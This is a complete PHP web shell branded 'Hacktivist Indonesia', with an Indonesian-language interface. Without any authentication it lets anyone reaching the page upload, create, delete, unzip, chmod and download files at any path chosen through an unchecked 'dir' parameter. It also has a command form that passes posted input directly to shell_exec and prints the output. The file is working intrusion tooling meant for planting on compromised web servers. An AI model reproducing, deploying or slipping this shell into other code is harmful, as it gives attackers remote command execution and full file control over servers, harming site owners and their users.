<?php

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$files_per_page = 20;
$current_page = isset($_GET['page']) ? intval($_GET['page']) : 1;

if (isset($_FILES['file_to_upload'])) {
    $upload_file = $current_dir . '/' . basename($_FILES['file_to_upload']['name']);
    if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $upload_file)) {
        echo "<div class='success'>File berhasil diunggah.</div>";
    } else {
        echo "<div class='error'>Gagal mengunggah file.</div>";
    }
}

if (isset($_POST['new_file'])) {
    $new_file_path = $current_dir . '/' . $_POST['new_file'];
    if (file_put_contents($new_file_path, '') !== false) {
        echo "<div class='success'>File berhasil dibuat.</div>";
    } else {
        echo "<div class='error'>Gagal membuat file.</div>";
    }
}

if (isset($_POST['new_folder'])) {
    $new_folder_path = $current_dir . '/' . $_POST['new_folder'];
    if (mkdir($new_folder_path)) {
        echo "<div class='success'>Folder berhasil dibuat.</div>";
    } else {
        echo "<div class='error'>Gagal membuat folder.</div>";
    }
}

if (isset($_GET['delete'])) {
    $file_to_delete = $_GET['delete'];
    if (is_dir($file_to_delete)) {
        rmdir($file_to_delete);
        echo "<div class='success'>Folder berhasil dihapus.</div>";
    } else {
        unlink($file_to_delete);
        echo "<div class='success'>File berhasil dihapus.</div>";
    }
}

if (isset($_GET['unzip'])) {
    $file_to_unzip = $_GET['unzip'];
    $zip = new ZipArchive;
    if ($zip->open($file_to_unzip) === TRUE) {
        $zip->extractTo($current_dir);
        $zip->close();
        echo "<div class='success'>File berhasil di-unzip.</div>";
    } else {
        echo "<div class='error'>Gagal meng-unzip file.</div>";
    }
}

if (isset($_POST['chmod'])) {
    $chmod_file = $_POST['chmod_file'];
    $chmod_value = $_POST['chmod_value'];
    if (chmod($chmod_file, octdec($chmod_value))) {
        echo "<div class='success'>Izin file berhasil diubah.</div>";
    } else {
        echo "<div class='error'>Gagal mengubah izin file.</div>";
    }
}

$all_files = scandir($current_dir);
$files = array_slice($all_files, ($current_page - 1) * $files_per_page, $files_per_page);

function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $size >= 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function renderPagination($current_page, $total_files, $files_per_page) {
    $total_pages = ceil($total_files / $files_per_page);
    if ($total_pages <= 1) return;

    echo '<div class="pagination">';
    for ($i = 1; $i <= $total_pages; $i++) {
        if ($i == $current_page) {
            echo "<strong>$i</strong> ";
        } else {
            echo "<a href=\"?dir={$GLOBALS['current_dir']}&page=$i\">$i</a> ";
        }
    }
    echo '</div>';
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhP File Manager SukaJanda01</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 20px;
        }
        h2 {
            text-align: center;
            color: #444;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        form {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="file"], input[type="number"] {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #ccc;
        }
        input[type="submit"], .btn {
            background: #007BFF;
            color: #fff;
            padding: 10px;
            border: none;
            cursor: pointer;
            width: 100%;
        }
        input[type="submit"]:hover, .btn:hover {
            background: #0056b3;
        }
        .success {
            color: green;
            margin-bottom: 10px;
        }
        .error {
            color: red;
            margin-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        .actions {
            text-align: center;
        }
        .actions a, .actions form {
            display: inline-block;
            margin: 0 5px;
        }
        .actions a.btn, .actions input[type="submit"] {
            width: auto;
            padding: 5px 10px;
        }
        .pagination {
            margin-top: 20px;
            text-align: center;
        }
        .pagination a {
            padding: 5px 10px;
            margin: 0 5px;
            background: #007BFF;
            color: #fff;
            text-decoration: none;
        }
        .pagination a:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>PHP File Manager Hacktivist Indonesia</h2>

    <form enctype="multipart/form-data" method="post">
        Pilih file: <input name="file_to_upload" type="file"><br><br>
        <input type="submit" value="Upload File">
    </form>

    <hr>

    <form method="post">
        Nama file baru: <input type="text" name="new_file" placeholder="contoh.txt"><br><br>
        <input type="submit" value="Buat File">
    </form>

    <hr>

    <form method="post">
        Nama folder baru: <input type="text" name="new_folder" placeholder="nama_folder"><br><br>
        <input type="submit" value="Buat Folder">
    </form>

    <hr>

    <h3>Daftar File dan Folder</h3>
    <table>
        <tr>
            <th>Nama</th>
            <th>Ukuran</th>
            <th>Izin</th>
            <th>Tindakan</th>
        </tr>
        <?php foreach ($files as $file): ?>
            <?php if ($file == '.' || $file == '..') continue; ?>
            <tr>
                <td>
                    <?php if (is_dir($current_dir . '/' . $file)): ?>
                        <a href="?dir=<?php echo $current_dir . '/' . $file; ?>"><?php echo $file; ?>/</a>
                    <?php else: ?>
                        <?php echo $file; ?>
                    <?php endif; ?>
                </td>
                <td><?php echo is_file($current_dir . '/' . $file) ? formatSize(filesize($current_dir . '/' . $file)) : '-'; ?></td>
                <td><?php echo substr(sprintf('%o', fileperms($current_dir . '/' . $file)), -4); ?></td>
                <td class="actions">
                    <?php if (!is_dir($current_dir . '/' . $file)): ?>
                        <a href="?dir=<?php echo $current_dir; ?>&download=<?php echo $current_dir . '/' . $file; ?>" class="btn">Download</a>
                        <?php if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'): ?>
                            <a href="?dir=<?php echo $current_dir; ?>&unzip=<?php echo $current_dir . '/' . $file; ?>" class="btn">Unzip</a>
                        <?php endif; ?>
                    <?php endif; ?>
                    <a href="?dir=<?php echo $current_dir; ?>&delete=<?php echo $current_dir . '/' . $file; ?>" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="chmod_file" value="<?php echo $current_dir . '/' . $file; ?>">
                        <input type="number" name="chmod_value" placeholder="0777" style="width: 60px;">
                        <input type="submit" value="Chmod" class="btn">
                    </form>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>

    <?php
    renderPagination($current_page, count($all_files) - 2, $files_per_page);
    ?>

    <hr>

    <h3>Jalankan Perintah CMD</h3>
    <form method="post">
        <input type="text" name="cmd" placeholder="ls -la" required>
        <input type="submit" value="Jalankan Perintah" class="btn">
    </form>

    <?php
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
    }

    if (isset($_GET['download'])) {
        $file_to_download = $_GET['download'];
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_to_download).'"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
    ?>

</div>

</body>
</html>
